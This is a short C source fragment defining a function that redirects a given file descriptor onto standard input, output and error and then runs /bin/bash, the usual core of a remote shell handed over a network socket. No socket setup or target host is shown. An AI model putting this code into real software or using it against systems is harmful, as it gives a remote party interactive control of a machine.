#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <wait.h>
#include <pwd.h>
#include <sys/types.h>

int shell(int s){
    dup2(s, STDIN_FILENO);
    dup2(s, STDOUT_FILENO);
    dup2(s, STDERR_FILENO);
    return execl("/bin/bash", "/bin/bash", NULL);
}
